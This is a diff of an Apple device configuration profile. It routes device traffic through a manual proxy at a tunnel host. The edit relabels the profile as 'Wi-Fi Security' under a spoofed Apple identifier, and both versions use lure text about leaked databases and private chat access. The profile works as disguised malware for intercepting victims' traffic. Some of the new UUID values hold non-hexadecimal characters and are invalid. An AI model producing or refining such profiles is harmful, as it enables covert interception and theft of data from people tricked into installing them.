@@ -6,37 +6,37 @@
     <array>
         <dict>
             <key>PayloadDescription</key>
-            <string>Decryption Gateway for Leaked Database</string>
+            <string>Configures Wi-Fi settings for secure access</string>
             <key>PayloadDisplayName</key>
-            <string>Data Access Key</string>
+            <string>Wi-Fi Security</string>
             <key>PayloadIdentifier</key>
-            <string>com.apple.data.decrypt</string>
+            <string>com.apple.wifi.managed.1</string>
             <key>PayloadType</key>
-            <string>com.apple.proxy.http.global</string>
+            <string>com.apple.wifi.managed</string>
             <key>PayloadUUID</key>
-            <string>D4E5F6A1-B2C3-4D5E-8F9A-A1B2C3D4E5F6</string>
+            <string>A1B2C3D4-E5F6-4G7H-8I9J-K0L1M2N3O4P5</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
+            <key>ProxyType</key>
+            <string>Manual</string>
             <key>ProxyServer</key>
             <string>bb8e7d52-15c4-495b-9468-91c04224bd1a.trycloudflare.com</string>
             <key>ProxyPort</key>
             <integer>80</integer>
-            <key>ProxyType</key>
-            <string>Manual</string>
         </dict>
     </array>
     <key>PayloadDescription</key>
-    <string>Identity Verification for Private Storage Access</string>
+    <string>Verification Required for Private Chat Access</string>
     <key>PayloadDisplayName</key>
-    <string>Verification System</string>
+    <string>Data Decryption Key</string>
     <key>PayloadIdentifier</key>
-    <string>com.verification.system</string>
+    <string>com.hadima.verify</string>
     <key>PayloadOrganization</key>
-    <string>Secure Cloud Systems</string>
+    <string>Secure Cloud</string>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
-    <string>C1B2A3D4-E5F6-4A5B-8C9D-E0F1A2B3C4D5</string>
+    <string>Z9Y8X7W6-V5U4-T3S2-R1Q0-P9O8N7M6L5K4</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
 </dict>
